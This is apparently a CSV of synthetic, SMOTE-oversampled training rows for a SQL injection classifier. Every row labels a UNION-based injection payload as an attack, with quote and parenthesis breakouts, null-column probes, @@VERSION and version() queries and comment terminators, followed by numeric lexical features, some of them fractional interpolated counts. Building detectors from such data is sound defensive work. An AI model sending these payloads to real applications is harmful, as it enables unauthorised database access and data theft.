id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000435,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,0.7665506531072283,64.05602766215938,20.735993084460155,3.647660333651288,14.000000000000002,21.056027662159387,18.0,11.0,0.21871964291157747,0.32821823962872626,0.2812109694577425,0.17185114800195372,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.7359930844601532,0.0,3.264006915539847,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000083,0.6993509817353011,57.554137540893976,23.767805678100547,3.9204471419206786,22.715109150391232,14.374639746703835,14.0,6.4643886437989035,0.3883753140480805,0.25502451388826647,0.2446947863436596,0.11190538571999337,0.0,1.0,2.7678056781005482,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6965829656983558,3.7678056781005482,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000437,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.2937820464729589,70.92017727193983,15.840354543879657,3.097721581480629,50.31929091224069,1.0,7.680709087759315,11.920177271939828,0.7095896964128967,0.01410056795333206,0.1082432448803607,0.16806649075341043,0.9201772719398286,0.0,2.0,0.0,0.0,0.0,0.0,0.9201772719398286,0.0,0.0,8.079822728060172,2.0,0.9201772719398287,0.0,1.0,0.0,0.0,0.0,0.9201772719398288,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000438,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,0.021482271067315428,71.87850329934503,30.953270499748083,4.317626894260325,24.943924599697702,23.962616399798467,15.981308199899233,6.990654099949617,0.34698681466445597,0.3333861350285332,0.2223630267427553,0.09726402356425548,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.9906540999496172,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000439,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.09769225119438896,73.16629411743995,32.83370588256005,4.395411484391442,42.33258823487991,2.9168529412800233,17.0,10.916852941280023,0.5785012946509142,0.03989614289700852,0.2323603652974467,0.14924219715463052,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.916852941280023,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000440,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,0.0036836664890859973,74.99106349354423,31.004468253227888,4.343499779980164,45.98212698708845,2.0089365064557754,17.0,10.0,0.6131635805166391,0.02679234904056524,0.22669441472324167,0.13334965571955393,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.004468253227888,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000441,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,1.704369251459248,58.55347198518531,24.10694397037062,3.953754879821092,29.0,9.0,16.0,4.55347198518531,0.49530955944758215,0.15371675982855998,0.27327423969521775,0.07769944102864018,1.0,0.0,1.1069439703706194,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.1069439703706188,1.0,0.0,0.5534719851853096,0.4465280148146904,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000442,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000068,0.19731755468031617,67.9515275044848,16.0,3.1793551588375957,38.19388998206078,1.0,17.80611001793922,10.951527504484805,0.562121701845854,0.014716521618857586,0.2620035088101713,0.16115826772511718,0.0,1.0,1.9030550089696094,0.0,0.0,0.0,0.0,2.9515275044848046,0.0,0.0,5.048472495515195,1.9030550089696092,0.0,1.0,0.9515275044848048,0.04847249551519528,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.584091451771961,73.78257786312108,16.0,3.1094576306229227,48.24504247079332,1.0,13.12252123539666,11.415014156931106,0.655428424343573,0.013746734861128457,0.1765001286993737,0.15432471209592494,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8537535392327764,0.0,0.0,7.56126061769833,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000444,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,0.1960467482131129,59.0,21.0,3.858792251909536,14.000000000000002,28.287715457793063,7.712284542206937,9.0,0.23728813559322035,0.47945280436937393,0.13071668715604978,0.15254237288135594,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9280711355517344,0.0,0.0,5.071928864448266,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.9280711355517344,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000445,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,1.0892355950433255,58.934103974541415,21.715291631734804,3.755886574894525,24.722333053878426,13.496479288928189,14.0,6.715291631734803,0.41156483263003485,0.23563655572958336,0.2393726017510799,0.11342600988930183,1.0,0.0,2.6423541841325986,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0729374476022047,3.642354184132598,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,0.6857340517425807,78.81787637714254,27.0,4.132876501479046,29.0,24.0,15.0,10.817876377142532,0.3679457294811533,0.3045068106050924,0.19031675662818276,0.1372307032855716,3.0,0.0,2.6357527542850656,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,4.635752754285066,1.0,0.0,0.8178763771425327,0.18212362285746725,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000447,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.6049521148664071,77.0,25.733093532528677,3.8750479580763324,41.06762586988528,4.1992805975860374,23.0,8.73309353252868,0.5333457905179907,0.05453611165696151,0.2987012987012987,0.11341679912374908,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.733093532528679,0.0,0.0,1.0,0.7330935325286787,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000448,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.3918544458639774,77.0,26.692958077099696,3.9182494791502336,40.61408384580061,3.6929580770996964,23.0,9.692958077099696,0.5274556343610468,0.047960494507788276,0.2987012987012987,0.12588257242986617,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.846479038549848,0.0,0.0,1.0,0.8464790385498481,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000449,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.352428019569445,67.24649953831482,20.10140018467407,3.76573548946353,14.000000000000002,35.59439926130372,6.20280036934814,11.449299907662965,0.20847230911287745,0.5278566959909159,0.0934527533409034,0.1702182415553032,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.5507000923370352,0.0,0.0,6.89859981532593,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.5507000923370351,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000450,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.3228348496747176,62.657638714856596,24.0,3.9266486537023946,32.32611097188527,9.0,14.0,7.3315277429713195,0.5150094595069147,0.14409634069875102,0.22414986330916825,0.11674433648516608,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.3315277429713186,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000451,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,1.0969777595914512,67.74946684969159,14.562633287577105,2.9708862485290823,51.74946684969158,1.0,4.0,11.0,0.7636345172283692,0.014772842673226927,0.05909137069290771,0.16250126940549622,0.5626332875771048,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.437366712422897,2.0,0.5626332875771048,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000452,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,1.8916848662478547,58.24839934025712,22.082799780085708,3.8804999528557924,23.331199120342827,16.0,12.37580032987144,6.541399890042854,0.39806150943486446,0.27541746961427305,0.2143640618120207,0.1121569591388418,1.0,0.0,3.0,0.0,0.0,0.4586001099571464,0.0,1.0,0.0,0.0,1.0827997800857068,3.4586001099571466,1.0,0.0,1.0,0.0,0.0,0.45860010995714645,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.4586001099571465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4586001099571466
SMOTE_000453,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,1.2148039839237499,59.634421241317874,23.735489558593045,3.9652284262660173,29.490326372395362,10.3075369930543,15.673115751736425,4.163442124131787,0.49580917630431315,0.16868420743264556,0.2658907987930209,0.06961581747002038,0.0,1.245163186197681,0.0,0.0,0.0,1.0,0.0,0.9182789379341062,0.0,0.0,0.08172106206589369,1.0,0.0,1.0,0.0,0.9182789379341063,0.0,1.0,0.9182789379341065,0.0,0.0,0.0,0.0,1.0,1.0,0.9182789379341063,0.0,0.08172106206589362,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000454,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.20435729283374343,79.86978829901521,28.78127020590872,4.05958966022512,40.0,2.869788299015214,23.0,14.0,0.5008241246897771,0.03591355997217904,0.2879738716966218,0.175288443641422,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.869788299015213,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000455,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.2652545807462477,56.42723733146075,19.0,3.749404821534618,14.000000000000002,29.141789865168604,4.0,9.285447466292151,0.24935550061286998,0.5150222850138628,0.07124442874653428,0.16437778562673286,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.285447466292151,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000456,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.2414927669490199,73.0509491342246,21.45010545935829,3.7444635765112526,41.70063275614974,9.0,14.900210918716578,7.450105459358289,0.5704861843068696,0.12366062017688192,0.20390213034416566,0.10195106517208283,0.45010545935828916,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,1.0,0.4501054593582891,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000457,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.4129710771665923,62.79302495458013,22.827900181679464,3.9188881725159144,31.344199636641072,10.448825317939061,16.0,5.0,0.498851703432474,0.16670219417279558,0.2548160780150327,0.07963002437969773,0.0,0.0,2.206975045419866,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7930249545801344,3.206975045419866,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000458,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,0.650425305098752,71.52811724186482,21.48312965488111,3.767095536616108,14.000000000000002,38.02249379349185,8.0,11.505623448372964,0.19596677607009258,0.5312455642467302,0.11198101489719575,0.1608066447859815,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.505623448372963,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000459,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,1.0057748053330884,69.42968514033618,23.24497751002401,3.829496811304378,31.080359839615795,15.614392770648346,14.0,8.734932530072038,0.4585728730119084,0.21319749178025854,0.20302735000668437,0.1252022852011487,0.0,1.0,2.244977510024013,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.4899550200480256,3.244977510024013,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,0.19231069945351364,70.02291991484586,23.804583982969174,3.8568823227486635,38.218335931876695,9.0,14.0,8.804583982969174,0.5455842881955306,0.1286371576539452,0.20010224523947032,0.12567630891105389,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.8045839829691728,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000461,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,0.7396639144688482,62.19124776262354,20.0,3.643391456771113,14.000000000000002,21.588330350164718,17.20583482491764,9.39708258754118,0.22542758290268422,0.3457458272834786,0.27798225216362915,0.150844337650208,0.0,0.19854129377058982,3.0,0.0,0.0,0.0,0.0,2.8014587062294103,0.0,0.0,3.39708258754118,3.0,0.0,0.19854129377058982,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000462,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.08068072405116966,73.0,32.886786653671564,4.395091438262507,42.0,3.1132133463284397,17.0,10.88678665367156,0.5753424657534246,0.04264675816888272,0.2328767123287671,0.14913406374892546,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000463,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.041441807376886776,73.77674821379406,22.0,3.772661728012565,14.000000000000002,39.821398571035246,8.0,11.955349642758813,0.1898491395707101,0.5396354657315976,0.10848522261183435,0.162030172085858,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.955349642758813,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000464,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,1.6087640006758952,75.63177778775284,23.0,3.854034278611191,22.75239216038336,30.501594773588906,13.752392160383357,8.625398693397226,0.300169176821316,0.40542474338202616,0.17965998359238083,0.11474609620427711,0.3746013066027739,0.0,3.0,0.0,0.0,1.0,0.0,0.625398693397226,0.0,0.0,3.625398693397226,4.0,0.37460130660277396,0.0,1.0,0.0,0.0,1.0,0.6253986933972262,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000465,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,1.1243694392578891,76.43621784338147,31.0,4.26340229977854,44.08504287549137,2.9574785622543143,19.393696405635787,10.0,0.5774892640797102,0.038451018202104364,0.25318145762140154,0.1308782600967838,0.0,0.0,2.0,0.0,1.0,1.4787392811271571,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000466,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.8069799373525515,77.0,25.356041675210207,3.8633428996507155,42.57583329915917,3.0681250256306214,23.0,8.356041675210207,0.5529328999890801,0.03984577955364446,0.2987012987012987,0.10852002175597672,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.356041675210207,0.0,0.0,1.0,0.35604167521020746,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000467,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,0.9945256258404772,63.84382095474886,20.0,3.672129945960123,14.000000000000002,22.852298528999583,16.852298528999583,10.139223896749687,0.2207320113628774,0.3579030646399253,0.2633036311986921,0.15806129279850523,0.7130746322498958,0.0,3.0,0.0,0.0,0.0,0.0,2.7130746322498958,0.0,0.0,3.7130746322498958,3.0,0.7130746322498958,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
